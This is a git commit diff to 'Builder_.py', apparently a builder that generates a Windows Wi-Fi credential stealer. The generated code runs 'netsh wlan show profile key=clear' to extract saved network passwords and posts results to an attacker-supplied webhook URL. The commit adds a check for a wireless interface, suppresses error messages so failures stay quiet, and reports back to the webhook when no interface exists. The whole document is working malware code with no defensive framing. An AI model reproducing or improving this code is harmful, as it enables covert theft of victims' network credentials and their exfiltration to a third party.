4c3153919ea77541762f4b14b41ed5afc22e12cc
Storm <hasanfireneno22@gmail.com>
2024-12-03 19:36:18 +0300

    Update Builder_.py

--- Builder_.py
+++ Builder_.py
@@ -19,24 +19,43 @@ webhook_url = {dots}{webhook_url}{dots}
 def check_os():
     return os.name
 
+def check_wireless_interface():
+    try:
+        result = subprocess.run(
+            ["netsh", "wlan", "show", "interfaces"], capture_output=True, text=True, check=True
+        )
+
+        if "There is no wireless interface on the system" in result.stdout:
+            return False
+        return True
+
+    except subprocess.CalledProcessError as e:
+        return False
+
 def get_wifi_profiles():
     try:
-        profiles_result = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True, check=True)
+        profiles_result = subprocess.run(
+            ["netsh", "wlan", "show", "profiles"], capture_output=True, text=True, check=True
+        )
+
         profiles = re.findall(r"All User Profile\\s*:\\s*(.*)", profiles_result.stdout)
         wifi_credentials = []
 
         for profile_name in profiles:
             profile_name = profile_name.strip()
             try:
-                profile_details_result = subprocess.run(["netsh", "wlan", "show", "profile", profile_name, "key=clear"], capture_output=True, text=True, check=True)
-                
+                profile_details_result = subprocess.run(
+                    ["netsh", "wlan", "show", "profile", profile_name, "key=clear"],
+                    capture_output=True, text=True, check=True
+                )
+
                 password_search = re.search(r"Key Content\\s*:\\s*(.*)", profile_details_result.stdout)
                 password = password_search.group(1).strip() if password_search else "No password found"
                 
                 wifi_credentials.append(f"SSID: {{profile_name}}, Password: {{password}}")
 
             except subprocess.CalledProcessError as e:
-                print(f"Failed to retrieve profile for {{profile_name}}: {{e}}")
+                pass
 
         with open("output.txt", "w") as f:
             for info in wifi_credentials:
@@ -54,9 +73,17 @@ def get_wifi_profiles():
 
     except subprocess.CalledProcessError as e:
         pass
+
+def send_no_wireless_interface_message():
+    payload = {{'content': 'There is no wireless interface on the system.'}}
+    response = requests.post(webhook_url, data=payload)
+
 def start():
     if check_os() == 'nt': 
-        get_wifi_profiles()
+        if check_wireless_interface():
+            get_wifi_profiles()
+        else:
+            send_no_wireless_interface_message()
     else:
         payload = {{'content': 'OS not supported'}}
         requests.post(webhook_url, data=payload)
